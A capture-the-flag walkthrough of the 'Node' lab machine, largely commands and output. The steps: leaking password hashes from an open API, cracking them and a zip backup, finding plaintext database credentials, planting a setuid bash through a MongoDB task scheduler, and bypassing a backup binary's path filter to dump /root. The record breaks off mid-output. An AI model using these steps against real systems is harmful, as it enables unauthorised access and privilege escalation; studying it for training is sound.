# Node - Medium Box

## Nmap scan results

```
# Nmap 7.95 scan initiated Thu Sep 24 20:54:04 2026 as: nmap -p- -T4 -sVC -oA nmap/node -vvv 10.129.68.186
Nmap scan report for 10.129.68.186
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2026-09-24 20:54:04 EDT for 113s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE            REASON         VERSION
22/tcp   open  ssh                syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  hadoop-tasktracker syn-ack ttl 63 Apache Hadoop
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
|_http-title: MyPlace
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 24 20:55:57 2026 -- 1 IP address (1 host up) scanned in 112.98 seconds
```

## Enumerating port tcp/3000
Taking a first look of the web application, the home page of the web application revealed 3 potential usernames, namely `tom`, `mark` & `rastating` & a login functionality as well. I added the potential usernames to a text file `users.txt`.

![](images/image.png)

I decided to run a directory fuzzing scan, but first, I tried to see if the home page was accessible by visiting `/index.php` or `/index.html` to see what type of web application the host uses. However, I only got redirected to the home page & the web application didn't reveal the extensions. So, I went ahead & proxied the network traffic through `Burpsuite` to get a broader understanding of the web application.

Interestingly, when I started proxying the traffic through `Burpsuite` & visited the `Site Map` tab under the `Target` tab, I noticed that the web application was using `API(s)` to retrieve at least the user information.

![](images/image-1.png)

Also, when I opened up the network tab in my web browser by pressing `F12` to see what kind of API calls does the web application make for the operation purposes, I noticed that the web application was using files with the `.html` extension. So, I added the extension to my directory fuzzing scan to try to get the any kind of interesting files. I also added the `.txt` file extension just in case the web application had any interesting text files which are publicly accessible.

![](images/image-2.png)

```
ffuf -u http://10.129.68.186:3000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic -c -e .html,.txt -fs 3861


```

Since `Burpsuite` revealed that the web application is making a `GET` request to the `/api/users/latest`, I tried doing the same with the `curl` command to see what does the web application replies with & interestingly, it replied with a lot of useful information.

```
curl -s -X GET http://10.129.69.219:3000/api/users/latest | jq .
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

The most important thing to note here is that none of the users mentioned are admin, as we can tell by the `is_admin` field, which is set to `false` for every user.

I saved this useful information in a file which I named `users.json` & the passwords in a separate password file which I named `passwords.txt`. Since the password field does not seem like a plaintext password field, I copied the passwords & went to [CrackStation](https://crackstation.net) to see if it can crack these encrypted looking passwords, & fortunately for me, it did indeed crack 2 out of 3 passwords & all 3 of them were in `SHA256` hash format.

![](images/image-3.png)

Now that I have 2 unique set of credentials, one for the user `tom` & the other for the user `mark`, I saved the username:password combination in a separate file which I named `creds.txt`.

```
cat creds.txt
tom:spongebob
mark:snowflake
```

Since the web application was utilizing the APIs & the `home.js` script revealed that the API call the web application was making to was `/api/users/latest`, I tried to go back one directory at a time in order to see if the web application reveals any additional information. Fortunately for me, it did indeed reveal a sensitive information about an `admin` user.

```
curl -s -q -X GET http://10.129.69.219:3000/api/users | jq .[]
{
  "_id": "59a7365b98aa325cc03ee51c",
  "username": "myP14ceAdm1nAcc0uNT",
  "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
  "is_admin": true
}
{
  "_id": "59a7368398aa325cc03ee51d",
  "username": "tom",
  "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
  "is_admin": false
}
{
  "_id": "59a7368e98aa325cc03ee51e",
  "username": "mark",
  "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
  "is_admin": false
}
{
  "_id": "59aa9781cced6f1d1490fce9",
  "username": "rastating",
  "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
  "is_admin": false
}
```

I found another set of potentially useful credentials of an admin user on the web application. I, then, updated my `users.json`, `passwords.txt` & `creds.txt` files accordingly after going to CrackStation again to try to crack the password for the admin user.

![](images/image-4.png)

And I found the password for the admin user `myP14ceAdm1nAcc0uNT` as well. Now, I can login with the credentials for the admin user.

![](images/image-5.png)

Interestingly, there was a backup file available on the admin dashboard to download. I downloaded the file & took a look at it to see what does it contain. I ran the `file` command to see what type of a file is the backups file.

```
file myplace.backup 
myplace.backup: ASCII text, with very long lines (65536), with no line terminators
```

The command identified that the backup file is just an `ASCII text` file with no end-of-line (`\n`) characters at all. 

```
wc -c myplace.backup 
3459880 myplace.backup
head -c 512 myplace.backup 
UEsDBAoAAAAAABqJEFUAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADFMH7YjdRuGp1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAQTQQ/oT0kqcLR2PMd+sLnjyJnbeRzu7hrEfdl5/8wMPz8pUZD3NPQIVz3620h+WgiXLrLlV97fxu2y+7/DvTvB6mo/jMhysp4wpWwCwvSobt6l1zjytMuTAdz5mAl+QYUA/ynSQdePMXIvkwG30H0qK9eHwr0dMZbsqD9RcSatixeGzzh+klw7w3kxtADTQmBx5fGm2/O3V+uLT/7/G8Z7rVAc0Jol3cXo8Xq85BGStdN7Fqra42u4zlGH+aEMqFBlVKzog7ni3VHtPRFfBl49n3LDjRucw11W5k
```

The content of the file looks similar to that of a base64. So, I tried to decode the file & saved it to another file & checked with the `file` command to see what type of file does it turn out.

```
base64 -d myplace.backup > tmp
file tmp
tmp: Zip archive data, made by v3.0 UNIX, extract using at least v1.0, last modified Aug 16 2022 17:08:52, uncompressed size 0, method=store
```

Turns out that the base64 decoded file is just a `ZIP` archive file. I renamed the base64 decoded file to `backup.zip` & tried to extract the contents of it.

```
7z x backup.zip 

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2594909 bytes (2535 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 2594909

    
Enter password (will not be echoed):
```

Unfortunately, the zip file was password protected. So, I used the tool `zip2john` to extract the password hash followed with another tool `john` to extract the password in plaintext.

```
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
magicword        (backup.zip)     
1g 0:00:00:00 DONE (2026-09-26 20:27) 33.33g/s 6553Kp/s 6553Kc/s 6553KC/s 24782478..piggy9
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And the tool `john` was successfully able to crack the password for the zip file. Now, I can go ahead & extract the files that are compressed in the zip file using the same password.

```
7z x backup.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2594909 bytes (2535 KiB)

Extracting archive: backup.zip
--
Path = backup.zip
Type = zip
Physical Size = 2594909


Would you like to replace the existing file:
  Path:     ./var/www/myplace/package-lock.json
  Size:     0 bytes
  Modified: 2017-09-01 19:10:09
with the file from archive:
  Path:     var/www/myplace/package-lock.json
  Size:     21264 bytes (21 KiB)
  Modified: 2017-09-01 19:10:09
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y


Enter password (will not be echoed):
Everything is Ok

Folders: 156
Files: 707
Size:       6745791
Compressed: 2594909
ls var/www/myplace/
app.html  app.js  node_modules  package.json  package-lock.json  static
```

Turns out that the backup file contains the webroot directory of the web application. Now that I have the entire codebase of the web application. I, then, tried to find the `app.js` file to see the contents of it.

```
cd var/www/myplace
ls
app.html  app.js  node_modules  package.json  package-lock.json  static
```

Now that I have found the file, I took a look into the file to try to find additional information about the host.

```
head app.js -n 11

const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

And I found the password for the user `mark` in plaintext. Then, I tried to login as the user `mark` to see if the user uses the same password as his login password credential as well or not.

## Post Exploitation as Mark

```
ssh mark@10.129.69.219
The authenticity of host '10.129.69.219 (10.129.69.219)' can't be established.
ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.69.219' (ED25519) to the list of known hosts.
mark@10.129.69.219's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

              .-.
        .-'``(|||)
     ,`\ \    `-`.                 88                         88
    /   \ '``-.   `                88                         88
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888'
        `-..-(   )
              `-`




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ ls -lah
total 24K
drwxr-xr-x 3 root root 4.0K Sep  3  2017 .
drwxr-xr-x 5 root root 4.0K Aug 31  2017 ..
-rw-r--r-- 1 root root  220 Aug 31  2017 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug 31  2017 .bashrc
drwx------ 2 root root 4.0K Aug 31  2017 .cache
-rw-r----- 1 root root    0 Sep  3  2017 .dbshell
-rwxr-xr-x 1 root root    0 Sep  3  2017 .mongorc.js
-rw-r--r-- 1 root root  655 Aug 31  2017 .profile
```

Unfortunately, the user flag was not present inside the user `mark`'s home directory. So, I figured that I would need to move laterally & impersonate another user in order to obtain the user flag. Since there was a `MongoDB` instance running on the host, I decided to take a look at it. But in order to utilize the `MongoDB` instance as best as I can, I decided to take a look at the `app.js` file to see what is actually happening inside the `MongoDB` instance.

```
less /var/www/myplace/app.js
[...snip...]
app.get('/api/admin/backup', function (req, res) {
    if (req.session.user && req.session.user.is_admin) {
      var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
      var backup = '';

      proc.on("exit", function(exitCode) {
        res.header("Content-Type", "text/plain");
        res.header("Content-Disposition", "attachment; filename=myplace.backup");
        res.send(backup);
      });
[...snip...]
```

I noticed that the `app.js` file contains a section of code which runs the `/usr/local/bin/backup` with 3 arguments, namely `['-q', backup_key, __dirname]`. So, I went ahead & took a look at the file & its permissions.

```
mark@node:/var/www/myplace$ ls -lah /usr/local/bin/backup 
-rwsr-xr-- 1 root admin 17K Sep  3  2017 /usr/local/bin/backup
```

Turns out, the file has an `SUID` bit set & can be run in the context of the user `root`. I took a mental note of it cause the box revolves a lot around the backup stuff. I also found the `backup_key` that the web application uses in `app.js` to run the `/usr/local/bin/backup` command through `MongoDB`.

```
less /var/www/myplace/app.js
const express     = require('express');
const session     = require('express-session');
const bodyParser  = require('body-parser');
const crypto      = require('crypto');
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const path        = require("path");
const spawn        = require('child_process').spawn;
const app         = express();
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
[...snip...]
```

I tried to see if there are any cronjobs running on the box.

```
mark@node:/var/www/myplace$ crontab -l
no crontab for mark
```

The user `mark` does not have any kind of cron jobs running on the box, so, I went ahead to see what kind of process are running on the system.

```
mark@node:/var/www/myplace$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
[...snip...]
tom       1282  0.2  5.4 1019880 41064 ?       Ssl  02:35   0:00 /usr/bin/node /var/www/myplace/app.js
tom       1283  0.1  5.2 1007544 40008 ?       Ssl  02:35   0:00 /usr/bin/node /var/scheduler/app.js
[...snip...]
```

I found out that the user `tom` is running 2 `app.js` files, out of which I'm aware of only one file, the other file, however, I did not know anything about until just now. I went ahead to take a look into the `/var/scheduler/app.js` file to see if I find something interesting there.

```
mark@node:/var/scheduler$ cat /var/scheduler/app.js
const exec        = require('child_process').exec;
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

MongoClient.connect(url, function(error, db) {
  if (error || !db) {
    console.log('[!] Failed to connect to mongodb');
    return;
  }

  setInterval(function () {
    db.collection('tasks').find().toArray(function (error, docs) {
      if (!error && docs) {
        docs.forEach(function (doc) {
          if (doc) {
            console.log('Executing task ' + doc._id + '...');
            exec(doc.cmd);
            db.collection('tasks').deleteOne({ _id: new ObjectID(doc._id) });
          }
        });
      }
      else if (error) {
        console.log('Something went wrong: ' + error);
      }
    });
  }, 30000);

});
```

It seems like the box is using another `Mongo` database, namely `scheduler`, to handle a unique functionality, i.e., to execute system commands. So, I proceeded to use the `MongoDB` command line to execute commands as the user `tom`.

```
mark@node:/var/scheduler$ mongo -u mark -p '5AYRft73VtFpc84k' scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db.tasks.insert({"cmd":"cp /bin/bash /tmp/bash; chmod u+s /tmp/bash; chmod g+s /tmp/bash"})
WriteResult({ "nInserted" : 1 })
> exit
bye
mark@node:/var/scheduler$ ls -lah /tmp/bash
-rwsr-sr-x 1 tom tom 1014K Oct 13 21:38 /tmp/bash
mark@node:/var/scheduler$
```

I copied the `/bin/bash` file to `/tmp/` directory to not hinder with the original file, as I should in a real life pentest as well. However, in order to run the file `/tmp/bash` in the context of the user `tom`, I changed the permissions of the file & added the `SUID` binary bit for both, user & group. Setting the `SUID` bit for the group wasn't required, but I still added it just in case I need it in the future, as I usually do. Now that the `SUID` binary bit is set, I can run it in the context of the user `tom`.

## Post Exploitation as Tom

```
mark@node:/var/scheduler$ /tmp/bash -p
bash-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1000(tom) groups=1000(tom),1001(mark)
bash-4.3$ ls /home/tom
user.txt
bash-4.3$ wc -c /home/tom/user.txt
33 /home/tom/user.txt
```

And I was able to find the user flag just like that.

## Privilege Escalation

I noticed that only the `root` has the permissions required to make any kind of changes in `/home/tom/` diretory, so I cannot create an ssh key for the user `tom` & ssh into the box as the user for better flexibility.

```
bash-4.3$ ls -lah
total 40K
drwxr-xr-x 6 root root 4.0K Aug 16  2022 .
drwxr-xr-x 5 root root 4.0K Aug 31  2017 ..
lrwxrwxrwx 1 root root    9 Aug 16  2022 .bash_history -> /dev/null
-rw-r--r-- 1 root root  220 Aug 29  2017 .bash_logout
-rw-r--r-- 1 root root 3.7K Aug 29  2017 .bashrc
drwx------ 2 root root 4.0K Aug 29  2017 .cache
drwxr-xr-x 3 root root 4.0K Aug 30  2017 .config
-rw-r----- 1 root root    0 Sep  3  2017 .dbshell
-rwxr-xr-x 1 root root    0 Aug 30  2017 .mongorc.js
drwxrwxr-x 2 root root 4.0K Aug 29  2017 .nano
drwxr-xr-x 5 root root 4.0K Aug 31  2017 .npm
-rw-r--r-- 1 root root  655 Aug 29  2017 .profile
-rw-r----- 1 root tom    33 Oct 13 21:21 user.txt
```

Moving on to cron jobs, there was no cron job running under the context of the user `tom`.

```
bash-4.3$ crontab -l
no crontab for mark
```

However, I realized that the `SUID` bit was set for the file `/usr/local/bin/backup` & there was also a specific usage of the binary file, which was mentioned in `/var/www/myplace/app.js`. I noticed that the group owner of the file was `admin`, so I went ahead to took a look at the members of the group `admin`.

```
bash-4.3$ cat /etc/group | grep tom
adm:x:4:syslog,tom
cdrom:x:24:tom
sudo:x:27:tom
dip:x:30:tom
plugdev:x:46:tom
tom:x:1000:
lpadmin:x:115:tom
sambashare:x:116:tom
admin:x:1002:tom,root
```

The `/etc/group` file revealed that the tom is a member of the `admin` group, so I do have permissions to read & execute the file `/usr/local/bin/backup`. However, when I tried to execute the binary file, I ran into a `Permission Denied` error.

```
bash-4.3$ /usr/local/bin/backup -q '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474' /tmp
bash: /usr/local/bin/backup: Permission denied
```

Then, I went ahead to see which group(s) do I belong to & found out that I was not a member of the group `admin` & hence I received the `Permission denied` error while executing the binary.

```
bash-4.3$ groups
mark tom
```

I decided to change the ownership of the bash file, which I copied to the directory `/tmp/` & then proceed further. I tried doing it in the bash shell itself, but it didn't work & I received a `Operation not permitted` error.

```
bash-4.3$ chown tom:admin /tmp/bash
chown: changing ownership of '/tmp/bash': Operation not permitted
```

I exitted the current session & went back to perform the copying of the file operations in `MongoDB` under the context of the user `mark` to change the ownership of the copied bash file.

```
mark@node:/var/scheduler$ mongo -u mark -p '5AYRft73VtFpc84k' scheduler
MongoDB shell version: 3.2.16
connecting to: scheduler
> db.tasks.insert({"cmd":"rm /tmp/bash; cp /bin/bash /tmp/bash; chown tom:admin /tmp/bash; chmod u+s /tmp/bash; chmod g+s /tmp/bash"})
WriteResult({ "nInserted" : 1 })
> exit
bye
mark@node:/var/scheduler$ ls -lah /tmp/bash
-rwsr-sr-x 1 tom admin 1014K Oct 13 23:11 /tmp/bash
mark@node:/var/scheduler$ /tmp/bash -p
bash-4.3$ groups
mark admin
bash-4.3$ id
uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
bash-4.3$
```

Now that I'm a member of the group `admin`, I can execute the binary now. However, when I ran the file, I got some gibberish ASCII text, which I was not able to make any sense out of it. However, when I passed some nonsense arguments, such as `1 2 3`, I received something different & when I passed in one of the backup_key, I got something different than earlier.

```
bash-4.3$ /usr/local/bin/backup 1 2 3                                                           


             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [!] Ah-ah-ah! You didn't say the magic word!


bash-4.3$ /usr/local/bin/backup 1 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 3



             ____________________________________________________
            /                                                    \
           |    _____________________________________________     |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |             Secure Backup v1.0              |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |                                             |    |
           |   |_____________________________________________|    |
           |                                                      |
            \_____________________________________________________/
                   \_______________________________________/
                _______________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
:-----------------------------------------------------------------------------:
`---._.-----------------------------------------------------------------._.---'


 [+] Validated access token
 [+] Starting archiving 3
 [!] The target path doesn't exist



```

I tried a bunch of `Command Injection` in all the 3 parameters, but didn't get anywhere. At this point, I was stuck with having no idea of what to do. I watched `ippsec`'s walkthrough for the box in which he broke down the binary with the help of `radar2` & `binary ninja` to see what the binary is doing. He found a lot of bad characters, i.e., characters which were being blacklisted. He also found out that the output which I found out to be making absolutely no sense was just the base64 encoded string of the troll face. Apparently, the binary was zipping up the contents of the directory (`3rd argument`) & printing out the base64 encoded version of it. He had found out that one of the bad characters was `/root` along with a lot others. At this point, I kinda figured out the vulnerability which should allow me to zip the entire `/root/` directory, theoretically. Since only the `/root` word was blacklisted, it means that if I run the binary from the root directory of the entire system, i.e., `/`, & pass in `root` as the 3rd argument, then the binary should zip the `/root/` directory & print out the base64 encoded string. So, I went ahead & tried it.

```
bash-4.3$ cd /
bash-4.3$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root
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